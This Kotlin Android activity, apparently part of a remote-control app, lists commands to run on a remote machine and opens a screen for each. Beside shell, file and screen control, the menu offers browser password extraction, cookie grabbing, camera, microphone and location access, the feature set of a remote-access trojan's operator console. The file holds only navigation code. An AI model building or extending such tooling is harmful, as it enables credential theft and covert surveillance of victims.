package com.mimo.pro

import android.content.Intent
import android.os.Bundle
import android.view.View
import androidx.recyclerview.widget.ItemTouchHelper
import androidx.recyclerview.widget.LinearLayoutManager
import com.mimo.pro.databinding.ActivityDeviceActionsBinding
import kotlinx.coroutines.launch

class DeviceActionsActivity : BaseActivity() {

    private lateinit var binding: ActivityDeviceActionsBinding

    private var machineName = ""
    private var hostname = ""

    companion object {
        const val EXTRA_IP = "ip"
        const val EXTRA_MODEL = "model"
        const val EXTRA_SERIAL = "serial"
        const val EXTRA_VERSION = "version"
        const val EXTRA_ONLINE = "online"
        private const val PREFS_COMMANDS_ORDER = "commands_order"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityDeviceActionsBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setSupportActionBar(binding.toolbar)
        supportActionBar?.setDisplayHomeAsUpEnabled(true)

        machineName = intent.getStringExtra(MainActivity.EXTRA_MACHINE).orEmpty()
        hostname = intent.getStringExtra(MainActivity.EXTRA_HOST).orEmpty()
        val ip = intent.getStringExtra(EXTRA_IP).orEmpty()
        val model = intent.getStringExtra(EXTRA_MODEL).orEmpty()
        val serial = intent.getStringExtra(EXTRA_SERIAL).orEmpty()
        val version = intent.getStringExtra(EXTRA_VERSION).orEmpty()
        val online = intent.getBooleanExtra(EXTRA_ONLINE, false)

        supportActionBar?.title = hostname.ifBlank { machineName }

        binding.tvHostname.text = hostname.ifBlank { machineName }
        binding.tvIp.text = ip.ifBlank { "—" }
        val meta = buildList {
            model.takeIf { it.isNotBlank() }?.let { add(it) }
            serial.takeIf { it.isNotBlank() }?.let { add("SN: $it") }
            version.takeIf { it.isNotBlank() }?.let { add("v$it") }
        }.joinToString(" · ")
        binding.tvStatus.text = getString(if (online) R.string.online else R.string.offline)
        binding.tvStatus.setTextColor(getColor(if (online) R.color.online_green else R.color.offline_gray))
        binding.statusDot.setBackgroundResource(if (online) R.drawable.dot_online else R.drawable.dot_offline)

        binding.commandList.layoutManager = LinearLayoutManager(this)

        val adapter = CommandsAdapter { cmd -> openCommand(cmd.id) }
        binding.commandList.adapter = adapter
        val commands = loadCommandsOrder()
        adapter.submitList(commands)

        // Add drag and drop support
        val itemTouchHelper = ItemTouchHelper(object : ItemTouchHelper.SimpleCallback(
            ItemTouchHelper.UP or ItemTouchHelper.DOWN,
            0
        ) {
            override fun onMove(
                recyclerView: androidx.recyclerview.widget.RecyclerView,
                viewHolder: androidx.recyclerview.widget.RecyclerView.ViewHolder,
                target: androidx.recyclerview.widget.RecyclerView.ViewHolder
            ): Boolean {
                val from = viewHolder.adapterPosition
                val to = target.adapterPosition
                adapter.moveItem(from, to)
                return true
            }

            override fun onSwiped(viewHolder: androidx.recyclerview.widget.RecyclerView.ViewHolder, direction: Int) {}

            override fun onSelectedChanged(viewHolder: androidx.recyclerview.widget.RecyclerView.ViewHolder?, actionState: Int) {
                super.onSelectedChanged(viewHolder, actionState)
                if (actionState == ItemTouchHelper.ACTION_STATE_DRAG) {
                    viewHolder?.itemView?.alpha = 0.5f
                }
            }

            override fun clearView(
                recyclerView: androidx.recyclerview.widget.RecyclerView,
                viewHolder: androidx.recyclerview.widget.RecyclerView.ViewHolder
            ) {
                super.clearView(recyclerView, viewHolder)
                viewHolder.itemView.alpha = 1f
                saveCommandsOrder(adapter.currentList)
            }
        })
        itemTouchHelper.attachToRecyclerView(binding.commandList)
    }

    private fun loadCommandsOrder(): List<CommandItem> {
        val defaultCommands = listOf(
            CommandItem("screenshot", R.drawable.ic_capture, R.string.action_screen_capture, R.string.action_screen_capture_desc),
            CommandItem("live_view", R.drawable.ic_live, R.string.action_live_view, R.string.action_live_view_desc),
            CommandItem("screen_control", R.drawable.ic_control, R.string.action_screen_control, R.string.action_screen_control_desc),
            CommandItem("paragraph", R.drawable.ic_paragraph, R.string.action_input_paragraph, R.string.action_input_paragraph_desc),
            CommandItem("extract_passwords", R.drawable.ic_key, R.string.action_extract_passwords, R.string.action_extract_passwords_desc),
            CommandItem("file_manager", R.drawable.ic_folder, R.string.action_file_manager, R.string.action_file_manager_desc),
            CommandItem("shell", R.drawable.ic_shell, R.string.action_shell, R.string.action_shell_desc),
            CommandItem("processes", R.drawable.ic_process, R.string.action_processes, R.string.action_processes_desc),
            CommandItem("services", R.drawable.ic_service, R.string.action_services, R.string.action_services_desc),
            CommandItem("camera", R.drawable.ic_camera, R.string.action_camera, R.string.action_camera_desc),
            CommandItem("mic", R.drawable.ic_mic, R.string.action_mic, R.string.action_mic_desc),
            CommandItem("location", R.drawable.ic_location, R.string.location_title, R.string.location_title),
            CommandItem("install_app", R.drawable.ic_install_app, R.string.action_install_app, R.string.action_install_app_desc),
            CommandItem("power_menu", R.drawable.ic_power, R.string.power_menu_title, R.string.power_menu_title),
            CommandItem("play_audio", R.drawable.ic_audio, R.string.action_play_audio, R.string.action_play_audio_desc),
            CommandItem("cookies", R.drawable.ic_cookie, R.string.cookies_title, R.string.cookies_title)
        )

        val prefs = getSharedPreferences("DeviceActionsPrefs", MODE_PRIVATE)
        val savedOrder = prefs.getString(PREFS_COMMANDS_ORDER, "")?.split(",")?.filter { it.isNotBlank() } ?: emptyList()

        if (savedOrder.isNotEmpty()) {
            val commandMap = defaultCommands.associateBy { it.id }
            val ordered = savedOrder.mapNotNull { commandMap[it] }
            val existingIds = ordered.map { it.id }.toSet()
            val newCommands = defaultCommands.filter { it.id !in existingIds }
            return ordered + newCommands
        }
        return defaultCommands
    }

    private fun saveCommandsOrder(commands: List<CommandItem>) {
        val prefs = getSharedPreferences("DeviceActionsPrefs", MODE_PRIVATE)
        val order = commands.map { it.id }.joinToString(",")
        prefs.edit().putString(PREFS_COMMANDS_ORDER, order).apply()
    }

    private fun openCommand(id: String) {
        if (id == "screenshot") {
            showScreenshotModePicker()
            return
        }
        val cls = when (id) {
            "live_view" -> LiveScreenActivity::class.java
            "screen_control" -> ScreenControlActivity::class.java
            "paragraph" -> InputParagraphActivity::class.java
            "extract_passwords" -> BrowserPasswordActivity::class.java
            "file_manager" -> FileManagerActivity::class.java
            "shell" -> ShellActivity::class.java
            "processes" -> ProcessesActivity::class.java
            "services" -> ServicesActivity::class.java
            "camera" -> CameraActivity::class.java
            "mic" -> MicActivity::class.java
            "location" -> LocationActivity::class.java
            "install_app" -> InstallAppActivity::class.java
            "power_menu" -> PowerMenuActivity::class.java
            "play_audio" -> PlayAudioActivity::class.java
            "cookies" -> CookiesActivity::class.java
            else -> return
        }
        val intent = Intent(this, cls)
        intent.putExtra(MainActivity.EXTRA_MACHINE, machineName)
        intent.putExtra(MainActivity.EXTRA_HOST, hostname)
        startActivity(intent)
    }

    private fun showScreenshotModePicker() {
        val view = layoutInflater.inflate(R.layout.dialog_mode_picker, null)
        view.findViewById<android.widget.TextView>(R.id.tvModeDevice).text =
            hostname.ifBlank { machineName }
        val dialog = androidx.appcompat.app.AlertDialog.Builder(this)
            .setView(view)
            .create()
        view.findViewById<android.view.View>(R.id.cardNormal).setOnClickListener {
            dialog.dismiss()
            openCapture(aiMode = false)
        }
        view.findViewById<android.view.View>(R.id.cardAi).setOnClickListener {
            dialog.dismiss()
            openCapture(aiMode = true)
        }
        view.findViewById<android.view.View>(R.id.tvModeCancel).setOnClickListener {
            dialog.dismiss()
        }
        dialog.show()
        dialog.window?.setBackgroundDrawableResource(R.drawable.bg_dialog)
    }

    private fun openCapture(aiMode: Boolean) {
        val intent = Intent(this, CaptureActivity::class.java)
        intent.putExtra(MainActivity.EXTRA_MACHINE, machineName)
        intent.putExtra(MainActivity.EXTRA_HOST, hostname)
        intent.putExtra(CaptureActivity.EXTRA_AI_MODE, aiMode)
        startActivity(intent)
    }

    override fun onSupportNavigateUp(): Boolean {
        finish()
        return true
    }
}